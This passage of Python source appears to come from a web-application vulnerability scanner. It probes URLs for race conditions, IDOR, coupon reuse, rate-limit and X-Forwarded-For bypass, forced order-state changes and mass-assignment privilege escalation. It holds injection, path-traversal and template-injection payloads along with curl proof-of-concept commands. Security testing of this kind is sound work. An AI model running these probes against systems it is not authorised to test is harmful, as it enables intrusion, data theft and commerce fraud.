                return _blocking_req()

            try:
                with _cf.ThreadPoolExecutor(max_workers=N) as ex:
                    futs = [ex.submit(_synced_req) for _ in range(N)]
                    results_b = [f.result() for f in _cf.as_completed(futs, timeout=60)]
            except Exception as _e:
                log("WARN", f"BL-04: thread burst failed ({_e}) — using asyncio results only")

        valid_b = [r for r in results_b if isinstance(r, dict)]

        # ── Evaluate both sets of results ──────────────────────────────────
        def _count_successes(valid: list) -> tuple:
            statuses = [r["status"] for r in valid]
            succ = sum(
                1 for r in valid
                if r["status"] in (200, 201, 202)
                and not any(e in r["text"].lower() for e in ERROR_IND)
                and any(s in r["text"].lower() for s in SUCCESS_IND)
            )
            return succ, statuses

        succ_a, statuses_a = _count_successes(valid_a)
        succ_b, statuses_b = _count_successes(valid_b)
        best_succ = max(succ_a, succ_b)
        best_strat = "asyncio" if succ_a >= succ_b else "thread-burst"
        best_statuses = statuses_a if succ_a >= succ_b else statuses_b

        if best_succ > 1:
            findings.append(Finding(
                plugin="business_logic",
                title="BL-04: Race Condition — Multiple Successes",
                severity="CRITICAL", confidence=90.0,
                description=(
                    f"{best_succ}/{N} concurrent requests succeeded ({best_strat} strategy). "
                    "TOCTOU race detected — server did not use atomic locks or idempotency keys."
                ),
                evidence=(
                    f"Strategy:{best_strat} | Concurrent:{N} | Successes:{best_succ} | "
                    f"asyncio successes:{succ_a} | thread-burst successes:{succ_b} | "
                    f"Statuses:{dict((s, best_statuses.count(s)) for s in set(best_statuses))}"
                ),
                url=url,
                remediation=(
                    "Use atomic DB operations (SELECT FOR UPDATE / transactions). "
                    "Add idempotency keys to state-changing endpoints. "
                    "Use distributed locks (Redis SETNX) for cross-service operations."
                ),
                cwe="CWE-362", cvss=8.1, owasp="A04",
                poc=f"for i in $(seq 1 {N}); do curl -sk '{url}' & done; wait",
                tags=["business-logic", "race-condition", "toctou", best_strat],
            ))
            log("VULN", f"BL-04: Race — {best_succ}/{N} successes! (strategy: {best_strat})")
        return findings

    # BL-05: IDOR
    async def test_idor_business(self, url: str) -> list:
        findings = []; parsed = urlparse(url); params = parse_qs(parsed.query)
        id_params = [p for p in params if p.lower() in ID_PARAMS or
                     any(k in p.lower() for k in ["id","uid","order","invoice","account"])]
        if not id_params: log("SKIP", "BL-05: No ID params"); return findings
        log("BL", f"BL-05 IDOR — {len(id_params)} ID param(s)")
        for param in id_params:
            orig = params[param][0]
            base_r = await self.client.get(url)
            if not base_r: continue
            base_len = base_r["length"]; base_body = base_r["text"]
            test_ids = []
            if orig.isdigit():
                oid = int(orig)
                test_ids = [oid+1, oid-1, oid+2, 1, 2, 100, 9999, oid*2]
            else:
                try:
                    dec = base64.b64decode(orig).decode()
                    if dec.isdigit():
                        test_ids += [base64.b64encode(str(int(dec)+1).encode()).decode(),
                                     base64.b64encode(str(int(dec)-1).encode()).decode()]
                except (ValueError, base64.binascii.Error, Exception): pass
            for tid in list(set(str(i) for i in test_ids if str(i) != orig)):
                np = {**params, param: [str(tid)]}
                u2 = urlunparse(parsed._replace(query=urlencode(np, doseq=True)))
                r = await self.client.get(u2)
                if not r: continue
                diff = abs(r["length"] - base_len)
                # STRICT IDOR criteria to eliminate false positives:
                # 1. Response must be meaningfully different (>300 bytes or >20% ratio change)
                # 2. Must contain identifiable sensitive data patterns
                # 3. Levenshtein similarity must confirm content is genuinely different
                # 4. Must NOT be an error page in disguise
                size_ratio = diff / max(base_len, 1)
                meaningful_diff = diff > 300 or size_ratio > 0.20
                sim_score = _levenshtein_ratio(r["text"][:3000], base_body[:3000])
                content_differs = sim_score < 0.85
                SENSITIVE_PATTERNS = [
                    r'\b[\w.+-]+@[\w-]+\.[a-zA-Z]{2,}\b',
                    r'"(?:name|email|phone|address|ssn|dob|credit_card)":\s*"[^"]+"',
                    r'\b(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14})\b',
                    r'"(?:password|passwd|secret|token|api_key)":\s*"[^"]+"',
                    r'\b\d{3}-\d{2}-\d{4}\b',
                ]
                sens_match = next((re.search(p, r["text"]) for p in SENSITIVE_PATTERNS
                                   if re.search(p, r["text"])), None)
                # False-positive guard: only count the pattern if it does NOT
                # already appear in the baseline response for this URL.
                # If the baseline already shows an email/ID, the changed ID
                # just retrieved the same class of page, not different user data.
                if sens_match:
                    same_pattern_in_base = re.search(sens_match.re, base_body)
                    if same_pattern_in_base:
                        sens_match = None  # pattern is not new — not evidence of IDOR
                error_page = any(e in r["text"].lower() for e in [
                    "not found", "access denied", "forbidden", "unauthorized",
                    "error", "exception", "invalid", "no such"])
                if (r["status"] == 200 and meaningful_diff and content_differs
                        and sens_match and not error_page):
                    findings.append(Finding(
                        plugin="business_logic",
                        title=f"BL-05: IDOR — '{param}' ({orig}→{tid})",
                        severity="HIGH", confidence=90.0,
                        description=(f"'{param}' changed from {orig} to {tid} returns "
                                     f"different data containing sensitive patterns."),
                        evidence=(f"Orig:{orig}({base_len}B) | Test:{tid}({r['length']}B) | "
                                  f"Δ{diff}B | Sim:{sim_score:.2f} | "
                                  f"Sensitive pattern: {sens_match.group()[:40]}"),
                        url=u2, param=param, payload=str(tid),
                        remediation="Enforce object-level authorization on every request. Use non-sequential UUIDs.",
                        cwe="CWE-639", cvss=8.5, owasp="A01",
                        poc=f"curl -sk '{u2}' --cookie '{self.cfg.cookies}'",
                        tags=["business-logic","idor","bola","confirmed"],
                    ))
                    log("VULN", f"BL-05: IDOR {param}={tid} (sensitive data confirmed)"); break
        return findings

    # BL-06: Coupon Reuse
    async def test_coupon_reuse(self, url: str, coupon_codes: list = None) -> list:
        findings = []; parsed = urlparse(url); params = parse_qs(parsed.query)
        cp = [p for p in params if p.lower() in DISCOUNT_PARAMS or
              any(k in p.lower() for k in ["coupon","promo","voucher","code","discount"])]
        codes = coupon_codes or ["SAVE10","DISCOUNT","FREE","100OFF","PROMO2024","TEST","ADMIN","NEWUSER"]
        log("BL", f"BL-06 Coupon reuse — {len(cp)} param(s), {len(codes)} codes")
        for param in cp:
            for code in codes:
                np = {**params, param: [code]}
                u2 = urlunparse(parsed._replace(query=urlencode(np, doseq=True)))
                r = await self.client.get(u2)
                if not r: continue
                body = r["text"].lower()
                accepted = (any(s in body for s in ["discount applied","code valid","promo applied","savings","you save","coupon applied"]) and
                            not any(e in body for e in ["invalid code","expired","already used","not valid","error"]))
                if accepted:
                    r2 = await self.client.get(u2)
                    r3 = await self.client.get(u2)
                    if r3 and any(s in r3["text"].lower() for s in ["discount applied","code valid","coupon applied"]):
                        findings.append(Finding(
                            plugin="business_logic", title=f"BL-06: Coupon Reuse — '{code}'",
                            severity="HIGH", confidence=85.0,
                            description=f"Coupon '{code}' accepted multiple times.",
                            evidence=f"Code '{code}' applied 3× (HTTP {r['status']})",
                            url=u2, param=param, payload=code,
                            remediation="Mark coupon used after first redemption. DB-level unique constraint per user+code.",
                            cwe="CWE-841", cvss=7.5, owasp="A04",
                            poc=f"for i in 1 2 3; do curl -sk '{u2}'; done",
                            tags=["business-logic","coupon-reuse"],
                        ))
                        log("VULN", f"BL-06: Coupon '{code}' reused!")
        if cp and len(codes) >= 2:
            stack_url = (url + ("&" if "?" in url else "?") +
                         f"{cp[0]}[]={codes[0]}&{cp[0]}[]={codes[1]}")
            rs = await self.client.get(stack_url)
            if rs and rs["status"] == 200 and any(s in rs["text"].lower() for s in SUCCESS_IND):
                findings.append(Finding(
                    plugin="business_logic", title="BL-06: Coupon Stacking Possible",
                    severity="MEDIUM", confidence=60.0,
                    description="Multiple coupon codes accepted in one request.",
                    evidence=f"Stacked: {codes[0]}+{codes[1]}", url=stack_url, param=cp[0],
                    remediation="Limit one coupon per order.",
                    cwe="CWE-841", cvss=5.3, owasp="A04",
                    tags=["business-logic","coupon-stacking"],
                ))
        return findings

    # BL-07: Limit Bypass
    async def test_limit_bypass(self, url: str) -> list:
        findings = []; parsed = urlparse(url); params = parse_qs(parsed.query)
        log("BL", "BL-07 Limit bypass")
        qp = [p for p in params if p.lower() in QTY_PARAMS or
              any(k in p.lower() for k in ["qty","quantity","count","num"])]
        for param in qp:
            for extreme in ["999","9999","99999"]:
                np = {**params, param: [extreme]}
                u2 = urlunparse(parsed._replace(query=urlencode(np, doseq=True)))
                r = await self.client.get(u2)
                if not r: continue
                bl = r["text"].lower()
                if r["status"] == 200 and not any(e in bl for e in ["maximum","limit exceeded","too many","max quantity","out of stock"]):
                    findings.append(Finding(
                        plugin="business_logic",
                        title=f"BL-07: Quantity Limit Bypass — '{param}'={extreme}",
                        severity="MEDIUM", confidence=70.0,
                        description=f"Quantity {extreme} accepted for '{param}'.",
                        evidence=f"{param}={extreme} → HTTP {r['status']} | no limit error",
                        url=u2, param=param, payload=extreme,
                        remediation="Enforce max quantity server-side.",
                        cwe="CWE-770", cvss=5.3, owasp="A04",
                        poc=f"curl -sk '{u2}'", tags=["business-logic","limit-bypass"],
                    ))
                    log("WARN", f"BL-07: Qty {extreme} accepted"); break
        # Rate-limit check: send 30 rapid requests; only flag if NONE return 429/503
        # 5 requests is far too few to distinguish rate-limited from rate-unlimited endpoints.
        rapid = []
        for _ in range(30):
            r = await self.client.get(url)
            if r: rapid.append(r["status"])
            await asyncio.sleep(0.02)
        if len(rapid) >= 25 and all(s == 200 for s in rapid) and 429 not in rapid and 503 not in rapid:
            findings.append(Finding(
                plugin="business_logic", title="BL-07: No Rate Limit Detected",
                severity="LOW", confidence=70.0,
                description="30 rapid requests all received HTTP 200 with no throttling response.",
                evidence=f"30 rapid requests → all 200, no 429/503 seen", url=url,
                remediation="Implement per-user/per-IP rate limiting. Return 429 on excess.",
                cwe="CWE-799", cvss=4.0, owasp="A04",
                poc=f"for i in $(seq 1 30); do curl -sk '{url}'; done",
                tags=["business-logic","rate-limit"],
            ))
        # XFF bypass: only flag if the server was already returning 429 for normal requests
        # and then STOPS returning 429 when we spoof the IP — proving actual bypass.
        # Without an existing rate-limit, XFF bypass is meaningless (nothing to bypass).
        if 429 in rapid:
            xff_bypass = []
            for i in range(10):
                r = await self.client.get(url, headers={"X-Forwarded-For": f"203.0.113.{i+1}"})
                if r: xff_bypass.append(r["status"])
                await asyncio.sleep(0.05)
            if xff_bypass and 429 not in xff_bypass and all(s == 200 for s in xff_bypass):
                findings.append(Finding(
                    plugin="business_logic", title="BL-07: Rate Limit Bypass via X-Forwarded-For",
                    severity="MEDIUM", confidence=75.0,
                    description="Spoofed X-Forwarded-For IPs bypassed active rate limiting.",
                    evidence=f"Normal requests hit 429; XFF-spoofed requests all 200 ({len(xff_bypass)} requests)",
                    url=url,
                    remediation="Rate-limit by authenticated user, not just IP. Distrust X-Forwarded-For from untrusted sources.",
                    cwe="CWE-799", cvss=5.0, owasp="A04",
                    poc=f"curl -sk '{url}' -H 'X-Forwarded-For: 203.0.113.1'",
                    tags=["business-logic","rate-limit","xff-bypass","confirmed"],
                ))
        return findings

    # BL-08: State Transitions
    async def test_state_transitions(self, url: str) -> list:
        findings = []; parsed = urlparse(url); params = parse_qs(parsed.query)
        sp = [p for p in params if p.lower() in STATUS_PARAMS or
              any(k in p.lower() for k in ["status","state","step","phase"])]
        STATES = [("shipped","Force ship"),("delivered","Force deliver"),
                  ("approved","Force approve"),("paid","Force pay"),
                  ("completed","Force complete"),("refunded","Force refund")]
        log("BL", f"BL-08 State transitions — {len(sp)} status param(s)")
        for param in sp:
            orig = params[param][0]
            for state, desc in STATES:
                if state == orig.lower(): continue
                np = {**params, param: [state]}
                u2 = urlunparse(parsed._replace(query=urlencode(np, doseq=True)))
                r = await self.client.get(u2)
                if not r: continue
                bl = r["text"].lower()
                rejected = any(e in bl for e in [
                    "invalid state","not allowed","forbidden","invalid transition",
                    "error","cannot","bad request","invalid","not permitted",
                    "unauthorized","illegal","not valid"
                ])
                if rejected or r["status"] not in (200, 201, 202):
                    continue
                # Require a positive confirmation signal — state change accepted
                accepted = any(s in bl for s in SUCCESS_IND + [
                    state, "updated", "changed", "modified", "saved",
                ])
                if not accepted:
                    continue
                # Also confirm the response actually changed from original state
                base_r_state = await self.client.get(url)
                if base_r_state:
                    sim = _levenshtein_ratio(r["text"][:2000], base_r_state["text"][:2000])
                    if sim > 0.93:
                        continue  # Response nearly identical — server ignored state change
                findings.append(Finding(
                    plugin="business_logic",
                    title=f"BL-08: Illegal State Transition Confirmed — '{param}'={state}",
                    severity="HIGH", confidence=82.0,
                    description=f"'{param}' accepted illegal value '{state}' ({desc}) with success confirmation.",
                    evidence=f"Orig:{orig} → {state} | HTTP {r['status']} | Success confirmed",
                    url=u2, param=param, payload=state,
                    remediation="Implement a strict server-side state machine. Validate all state transitions.",
                    cwe="CWE-841", cvss=7.5, owasp="A04",
                    poc=f"curl -sk '{u2}'", tags=["business-logic","state-machine","confirmed"],
                ))
                log("VULN", f"BL-08: Illegal state '{state}' accepted with confirmation"); break
        return findings

    # BL-09: Mass Assignment
    async def test_mass_assignment(self, url: str) -> list:
        findings = []; parsed = urlparse(url); params = parse_qs(parsed.query)
        log("BL", "BL-09 Mass assignment")
        PRIV_ESC = [r"role.*admin",r"is_admin.*true",r"admin.*true",
                    r"privilege.*grant",r"access.*granted",r"superuser.*true",
                    r"you are now admin",r"account.*upgraded",r"admin panel",r"admin dashboard"]
        def has_privesc(text: str) -> tuple:
            tl = text.lower()
            for pat in PRIV_ESC:
                if re.search(pat, tl): return True, pat
            return False, ""
        extra = {p: ["true"] for p in MASS_ASSIGN_EXTRA}
        np = {**params, **extra}
        u2 = urlunparse(parsed._replace(query=urlencode(np, doseq=True)))
        r = await self.client.get(u2)
        if r and r["status"] in (200,201,202):
            escalated, matched = has_privesc(r["text"])
            base_r = await self.client.get(url)
            base_len = base_r["length"] if base_r else 0
            if escalated:
                findings.append(Finding(
                    plugin="business_logic",
                    title="BL-09: Mass Assignment — Privilege Escalation via URL",
                    severity="CRITICAL", confidence=85.0,
                    description="Extra privilege parameters caused detectable privilege escalation.",
                    evidence=f"Matched: '{matched}' | Params: {list(extra.keys())[:5]}",
                    url=u2, remediation="Whitelist allowed fields server-side. Never auto-bind request parameters.",
                    cwe="CWE-915", cvss=9.0, owasp="A04",
                    poc=f"curl -sk '{u2}'", tags=["mass-assignment","privilege-escalation"],
                ))
                log("VULN", "BL-09: Mass assignment URL — privilege escalation confirmed")
        json_data = {p: "true" for p in MASS_ASSIGN_EXTRA}
        rj = await self.client.post(url, json_body=json_data)
        if rj and rj["status"] in (200,201,202):
            escalated, matched = has_privesc(rj["text"])
            if escalated:
                findings.append(Finding(
                    plugin="business_logic",
                    title="BL-09: Mass Assignment — Privilege Escalation via JSON",
                    severity="CRITICAL", confidence=90.0,
                    description="JSON body with privilege fields triggered confirmed privilege escalation.",
                    evidence=f"Matched: '{matched}' | HTTP {rj['status']}",
                    url=url, remediation="Use Data Transfer Objects. Validate and filter all input fields.",
                    cwe="CWE-915", cvss=9.0, owasp="A04",
                    poc=f"curl -sk '{url}' -X POST -H 'Content-Type: application/json' -d '{json.dumps(json_data)}'",
                    tags=["mass-assignment","json-binding","privilege-escalation"],
                ))
                log("VULN", "BL-09: JSON mass assignment — privilege escalation confirmed")
        return findings

    # BL-10: Input Validation Bypass
    async def test_input_validation_bypass(self, url: str) -> list:
        findings = []; parsed = urlparse(url); params = parse_qs(parsed.query)
        if not params: log("SKIP", "BL-10: No params"); return findings
        log("BL", "BL-10 Input validation bypass")
        SPECIALS = [("%00","Null byte"),("' OR '1'='1","SQLi stub"),
                    ("../../../etc/passwd","Path traversal"),
                    ("\\r\\n","CRLF"),("${7*7}","SSTI EL"),("{{7*7}}","SSTI Jinja2"),
                    ("😀"*50,"Unicode flood"),("A"*5000,"Long string overflow")]
        for param in params:
            for payload, desc in SPECIALS:
                np = {**params, param: [payload]}
                u2 = urlunparse(parsed._replace(query=urlencode(np, doseq=True)))
                r = await self.client.get(u2)
                if not r: continue
                body = r["text"]
                if payload not in body or r["status"] != 200:
                    continue
                # Verify payload is NOT HTML-encoded (encoded = not a real vulnerability)
                html_encoded = any([
                    payload.replace("<", "&lt;").replace(">", "&gt;") in body,
                    payload.replace("<", "&#60;").replace(">", "&#62;") in body,
                    payload.replace('"', "&quot;") in body,
                    payload.replace("'", "&#39;") in body,
                ])
                if html_encoded:
                    continue
                # For SSTI payloads: require math evaluation evidence
                if "7*7" in payload and "49" not in body:
                    continue
                # For path traversal: require system file content signatures
                if "etc/passwd" in payload:
                    if not re.search(r'root:.*:0:0', body):
                        continue
                findings.append(Finding(
                    plugin="business_logic",
                    title=f"BL-10: Input Validation Bypass Confirmed — '{param}'",
                    severity="HIGH", confidence=80.0,
                    description=f"'{param}' processed '{desc}' payload unencoded with server-side evidence.",
                    evidence=f"Payload '{payload[:40]}' literal in response | Not HTML-encoded",
                    url=u2, param=param, payload=payload,
                    remediation="Strict input validation. Output encoding. Parameterized queries.",
                    cwe="CWE-20", cvss=6.5, owasp="A03",
                    poc=f"curl -sk '{u2}'", tags=["input-validation","reflected","confirmed"],
                ))
                log("VULN", f"BL-10: '{desc}' confirmed in '{param}'")
        return findings

    # BL-11: Client-side Logic
    async def test_client_side_logic(self, url: str) -> list:
        findings = []; r = await self.client.get(url)
        if not r: return findings
        log("BL", "BL-11 Client-side logic")
        PATTERNS = [
            (r'if\s*\(\s*price\s*[<>=]', "Price validation in JS"),
            (r'if\s*\(\s*coupon\s*===?', "Coupon validation in JS"),
            (r'discount\s*=', "Discount calc in JS"),
            (r'function\s+validate\w*', "Client-side validation fn"),
            (r'role\s*===?\s*["\']admin', "Role check in JS"),
            (r'\.reduce\s*\([^)]*price', "Price aggregation in JS"),
        ]
        scripts = re.findall(r'<script[^>]*>(.*?)</script>', r["text"], re.DOTALL | re.I)
        js = "\\n".join(scripts)
        found = [desc for pat, desc in PATTERNS if re.search(pat, js, re.I)]
        if found:
            findings.append(Finding(
                plugin="business_logic", title="BL-11: Client-side Business Logic",
                severity="LOW", confidence=80.0,
                description="Critical logic (pricing/discounts/roles) in client JS — easily bypassed.",
                evidence=f"Patterns: {', '.join(found)}", url=url,
                remediation="Move all business logic to server-side.",
                cwe="CWE-602", cvss=3.7, owasp="A04", tags=["client-side","javascript"],
            ))
            log("WARN", "BL-11: Client-side business logic detected")
        return findings

